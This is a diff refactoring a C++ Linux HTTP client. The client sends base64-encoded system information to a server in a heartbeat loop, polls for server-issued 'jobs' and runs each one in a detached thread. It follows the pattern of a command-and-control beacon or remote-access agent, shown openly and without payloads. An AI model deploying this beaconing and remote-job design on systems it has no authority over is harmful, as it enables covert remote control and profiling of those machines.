@@ -31,6 +31,18 @@
 #define NUM_OF_ARGS 3
 
 
+std::wstring createHeartbeatRequest(const std::wstring &sysInfoInJson){
+
+    std::string dataBase64 = base64_encode((unsigned char*)ws2s(sysInfoInJson).c_str(), sysInfoInJson.length());
+    std::wstringstream contentLengthStream;
+    contentLengthStream << dataBase64.length();
+    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
+    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
+    request += L"Connection: close\r\n"; 
+    request += L"\r\n" + s2ws(dataBase64);
+    return request;
+}
+
 int main(int argc, char** argv) {
 
     if(argc != NUM_OF_ARGS){
@@ -40,43 +52,32 @@ int main(int argc, char** argv) {
 
     const std::wstring url{ s2ws(argv[1]) };
     const std::wstring port{ s2ws(argv[2]) };
+
     if (!isValidPort(ws2s(port))) {
 		return -1;
 	}
-
-    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
     const std::wstring sysInfo {getSysInfo()};
-       if(sysInfo.empty()){
-        std::cout << "Couldn't extract system information\n";
-        //exit(-1);     // Inform CRC about the this status by sending log or json NULL bytes
-    }
     SharedResourceManager sharedResources;
     sharedResources.setSysInfoInJson(sysInfo);
- 
-    std::string dataBase64 = base64_encode((unsigned char*)ws2s(sysInfo).c_str(), sysInfo.length());
-    std::wstringstream contentLengthStream;
-    contentLengthStream << dataBase64.length();
-    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
-    request += L"Connection: close\r\n"; 
-    request += L"\r\n" + s2ws(dataBase64); 
-    
+    const std::wstring heartbeatRequestToServer {createHeartbeatRequest(sysInfo)}; 
+    std::wstring request { heartbeatRequestToServer }; 
     std::wstring replyFromServerInJson;
-    std::wstring response;    
-    const std::wstring heartbeatRequestToServer = request;
+    std::wstring response;       
+    HttpPost httpPost;
     
     while(true){
         if(sharedResources.isResponseAvailable()){      // If there is a response to be send to the server
             request = sharedResources.popResponse();
+            replyFromServerInJson = httpPost(url, port, request);
         }
-        else {                                          // else, send the standard http post message to the server
-            request = heartbeatRequestToServer;
-        }        
-        replyFromServerInJson = httpPost(url, port, request);        
-        if(isJobAvailable(replyFromServerInJson)){  // Check the response from the server to see if it is a job request
+        else {                                          // else, send alive signal to server
+            replyFromServerInJson = httpPost(url, port, heartbeatRequestToServer);
+        }
+        if(isJobAvailable(replyFromServerInJson)){      // Check the response from the server to see if it is a job request
             sharedResources.pushJob(replyFromServerInJson);
             std::thread jobThread(startJob, std::ref(sharedResources));      // Spawn a thread if there is a job waiting in the queue
             jobThread.detach();
-        }                      
-        request = heartbeatRequestToServer;      
+        }                          
     }
+    return 0;
 }
